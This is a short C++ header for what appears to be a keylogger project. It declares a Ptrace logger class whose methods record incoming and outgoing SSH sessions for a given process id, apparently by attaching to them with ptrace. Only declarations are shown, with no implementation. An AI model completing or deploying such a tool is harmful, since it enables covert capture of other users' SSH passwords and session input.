#ifndef KEYLOGGER_PTRACE_HPP
#define KEYLOGGER_PTRACE_HPP

#include "tracer.hpp"
#include "logger.hpp"


namespace logger{

    class Ptrace : public Logger{
    public:
        explicit Ptrace(std::string path_to_log) : path_to_log(std::move(path_to_log)) {};
        void ssh_incoming_logger(const pid_t &pid) override;
        void ssh_outgoing_logger(const pid_t &pid) override;
    private:
        std::string path_to_log{};
    };

}

#endif //KEYLOGGER_PTRACE_HPP
